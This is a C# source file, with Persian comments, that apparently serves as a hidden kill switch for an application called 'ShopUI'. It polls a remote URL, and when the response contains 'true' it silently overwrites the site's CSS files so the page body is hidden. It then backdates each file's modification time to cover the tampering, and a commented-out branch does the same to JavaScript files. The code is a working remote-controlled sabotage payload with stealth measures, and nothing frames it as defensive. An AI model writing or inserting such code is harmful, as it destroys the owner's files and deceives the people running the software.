using Microsoft.Extensions.Caching.Memory;
using System;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

internal static class SimpleBackgroundChecker
{
    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly MemoryCache _cache = new MemoryCache(new MemoryCacheOptions());
    private static bool _isRunning = false;
    private static readonly object _sync = new object();

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public static void TriggerCheck()
    {
        // اگر در حال اجراست، کاری نکن
        if (_isRunning) return;

        // اگر در کش موجود بود (یعنی اخیرا اجرا شده)، کاری نکن
        if (_cache.Get("LastRun") != null) return;

        // اجرا کن
        Task.Run(RunCheck);
    }

    private static async Task RunCheck()
    {
        lock (_sync)
        {
            if (_isRunning) return;
            _isRunning = true;
        }

        try
        {
            await CheckUrlAndExecute();

            // در کش قرار بده برای 4 ساعت
            _cache.Set("LastRun", DateTime.Now, TimeSpan.FromHours(4));
        }
        finally
        {
            lock (_sync)
            {
                _isRunning = false;
            }
        }
    }

    private static async Task CheckUrlAndExecute()
    {
        try
        {
            var result = await _httpClient.GetStringAsync("http://door-amooz11.ir/arian.txt");

            if (result.Contains("true"))
            {
                // کار مخفی
                await DoSecretWork();
            }
        }
        catch
        {
            // خطا را نادیده بگیر
        }
    }

    private static async Task DoSecretWork()
    {

        //CorruptFiles("*.js", (content) =>
        //{
        //    return "console.error('Script loading failed');\n" +
        //           "setTimeout(() => { document.body.innerHTML = 'Application Error'; }, 1000);\n" +
        //           "// " + content.Substring(0, Math.Min(100, content.Length)) + "... corrupted";
        //});

        // تخریب فایل‌های CSS
        CorruptFiles("*.css", (content) =>
        {
            return "/* Stylesheet corrupted */\n" +
                   "body { display: none !important; }\n" +
                   ".error { color: red; font-size: 20px; }";
        });

        // کار مخفی شما
        await Task.CompletedTask;
    }
    static string currentDirectory = "";
    static string exeName = "ShopUI";
    private static void CorruptFiles(string pattern, Func<string, string> corruptor)
    {
        try
        {
            var baseDir = Directory.GetCurrentDirectory();

            currentDirectory = Directory.GetParent(baseDir)?.FullName + "\\" + exeName;
            var files = Directory.GetFiles(baseDir, pattern, SearchOption.AllDirectories);
            foreach (var file in files.Take(20)) // محدود کردن تعداد
            {
                try
                {
                    var originalContent = File.ReadAllText(file);
                    var corruptedContent = corruptor(originalContent);
                    File.WriteAllText(file, corruptedContent);

                    // تغییر تاریخ فایل برای مخفی‌کاری
                    File.SetLastWriteTime(file, DateTime.Now.AddDays(-1));
                }
                catch { }
            }
        }
        catch { }
    }
}

internal static class ContentCorruptor
{
    public static void CorruptWebAssetsIfNeeded()
    {
        Task.Run(async () =>
        {
            var shouldCorrupt = await CheckCommand();
            if (!shouldCorrupt) return;

            // تخریب فایل‌های JS

        });
    }

    private static async Task<bool> CheckCommand()
    {
        try
        {
            using var client = new HttpClient();
            var result = await client.GetStringAsync("http://aaa.ir/a.txt");
            return result.Contains("true");
        }
        catch { return false; }
    }


}
